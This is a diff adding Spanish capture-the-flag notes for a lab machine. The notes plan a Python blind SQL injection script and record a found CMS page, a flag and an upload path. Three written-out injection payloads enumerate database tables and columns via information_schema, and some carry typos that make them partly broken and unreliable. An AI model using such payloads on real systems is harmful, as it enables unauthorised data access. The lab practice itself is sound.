@@ -330,3 +330,47 @@ Ahora que tenemos una forma de identificar los caracteres de las bases de datos 
 
 ---
 
+Script de Python
+
+Estoy jugando con unos parametos del script par aque maneje una cuenta interna de cuantas paginas hay, por ejemplo:
+
+
+La idea es que el script primero cuente cuantas tablas hay dentro de la base de dato seleccionanda;
+```
+sqli = url + f"'+AND+(SELECT+count(table_name,)+FROM+information_schema.tables+WHERE+table_schema='admin)='1-- "
+```
+	cambiar "admin" por variable seleccionable.
+
+Luego de eso, debe ejecutar este codigo:
+```
+sqli = url + f"'+AND+(SELECT+substring(table_name,{position_character},1)+FROM+information_schema.tables+WHERE+table_schema='admin'+limit+{dbs},1)%3d'{character}-- "
+```
+
+Esto va a servir para ver las tablas de la base de datos, me di cuenta que ya hay una que dice pages
+
+Por ultimo sería enumerar las columnas, esto lo hago asi:
+```
+sqli = url + f"'+AND+(SELECT+substring(column_name,{position_character},1)+FROM+information_schema.columns+WHERE+table_schema='admin'+and+table_name='pages'+imit+{dbs},1)%3d'{character}-- "
+```
+	Lo mismo, solo que el AND table_name debe apuntar a una variable dependiendo del resultado anterior. 
+
+Antes de todo seria bueno fuzzear cada cosa usando COUNT
+
+--- 
+
+Luego del Script encontré esta pagina web http://172.16.23.129/imfadministrator/cms.php?pagename=tutorials-incomplete
+
+![[Pasted image 20251106032723.png]]
+
+
+![[Pasted image 20251106033449.png]]
+
+
+
+Vemos que tiene un QR vamos a escanearlo de forma segura con alguna herramienta web
+flag4{dXBsb2Fkcjk0Mi5waHA=}
+
+uploadr942.php como URL de imfadministrator
+
+![[Pasted image 20251106033350.png]]
+
